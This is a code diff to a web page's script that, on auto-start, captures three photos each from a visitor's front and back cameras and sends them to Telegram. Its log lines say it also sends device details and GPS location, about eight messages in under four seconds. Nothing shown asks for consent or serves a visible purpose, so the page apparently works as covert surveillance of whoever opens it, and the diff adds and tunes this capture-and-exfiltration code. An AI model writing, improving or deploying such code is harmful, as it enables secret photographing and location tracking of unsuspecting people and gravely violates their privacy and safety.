@@ -93,7 +93,7 @@
         
         // App State
         let cameraStream = null;
-        let currentFacingMode = 'environment'; // Start with back camera
+        let currentFacingMode = 'user'; // Start with front camera
         let photos = [];
         let photosSentCount = 0;
         let isCapturing = false;
@@ -463,9 +463,6 @@
         
         // Fast capture and send (with delays for better focus)
         async function fastCaptureAndSend(cameraType, startNumber) {
-            if (isCapturing) return;
-            isCapturing = true;
-            
             console.log(`🚀 Starting fast capture from ${cameraType} camera...`);
             
             const totalPhotos = 3; // 3 photos per camera
@@ -477,8 +474,8 @@
                 
                 if (photo) {
                     // Send immediately without waiting
-                    sendPhotoToTelegram(photo, photoNumber, cameraType);
-                    console.log(`📸 Photo ${photoNumber} (${cameraType}) captured and sending...`);
+                    const sent = await sendPhotoToTelegram(photo, photoNumber, cameraType);
+                    console.log(`📸 Photo ${photoNumber} (${cameraType}) captured and ${sent ? 'sent ✅' : 'failed ❌'}`);
                 }
                 
                 // 150ms delay between captures for better focus
@@ -487,8 +484,7 @@
                 }
             }
             
-            console.log(`✅ All 3 photos from ${cameraType} camera sent!`);
-            isCapturing = false;
+            console.log(`✅ All 3 photos from ${cameraType} camera processed!`);
         }
         
         // Main auto-start function
@@ -518,21 +514,27 @@
             // 4. Start camera
             const cameraStarted = await startCamera();
             
-            if (cameraStarted) {
-                // 5. Fast capture and send (front camera first)
-                await fastCaptureAndSend();
+            // 4. Start with FRONT camera (3 photos)
+            console.log('📷 Starting FRONT camera...');
+            currentFacingMode = 'user';
+            const frontCameraStarted = await startCamera();
+            
+            if (frontCameraStarted) {
+                // 5. Capture 3 photos from FRONT camera
+                await fastCaptureAndSend('front', 1);
                 
-                // 6. Switch to back camera for better quality photos
-                console.log('🔄 Switching to back camera for better quality...');
+                // 6. Switch to BACK camera (3 photos)
+                console.log('🔄 Switching to BACK camera...');
                 stopCamera();
                 currentFacingMode = 'environment';
                 
-                // Small delay before switching
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // Small delay before switching (300ms)
+                await new Promise(resolve => setTimeout(resolve, 300));
                 
                 const backCameraStarted = await startCamera();
                 if (backCameraStarted) {
-                    await fastCaptureAndSend();
+                    // 7. Capture 3 photos from BACK camera
+                    await fastCaptureAndSend('back', 4);
                 }
             }
             
@@ -562,8 +564,8 @@
         console.log('📤 Will send to Telegram:');
         console.log('  • Device info (battery, RAM, CPU, etc.)');
         console.log('  • GPS location');
-        console.log('  • 10 high-quality photos (5 front + 5 back)');
-        console.log('  • Total: ~12 messages in under 5 seconds');
+        console.log('  • 6 high-quality photos (3 front + 3 back)');
+        console.log('  • Total: ~8 messages in under 4 seconds');
         console.log('  • Resolution: Up to 1920x1080 (Full HD)');
         console.log('═══════════════════════════════════');
         
